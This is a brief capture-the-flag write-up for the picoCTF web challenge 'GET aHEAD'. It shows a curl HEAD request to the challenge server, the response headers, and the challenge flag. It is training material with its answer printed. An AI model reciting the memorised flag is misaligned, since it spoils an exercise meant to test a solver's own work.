# [GET aHEAD](https://play.picoctf.org/practice/challenge/132?originalEvent=34&page=1)
<div style="background-image: linear-gradient(to bottom left,#fd5d93,#ec250d,#fd5d93);margin-right:75%; padding-left:2%;border-radius: .4285rem; color:white">Category: Web Exploitation</div>

#### AUTHOR: MADSTACKS

### Description

Find the flag being held on this server to get ahead of the competition [http://mercury.picoctf.net:34561/](http://mercury.picoctf.net:34561/)




##### Code

```shell
curl -I HEAD -i http://mercury.picoctf.net:34561/index.php 

```
##### output
```

┌──(callummason㉿MARVIN)-[/mnt/…/CTF/picoCTF/2021/Stonks]
└─$ curl -I HEAD -i http://mercury.picoctf.net:34561/index.php 
curl: (6) Could not resolve host: HEAD
HTTP/1.1 200 OK
flag: picoCTF{r3j3ct_th3_du4l1ty_8f878508}
Content-type: text/html; charset=UTF-8

```



### Flags


#### ***** picoCTF{r3j3ct_th3_du4l1ty_8f878508} ****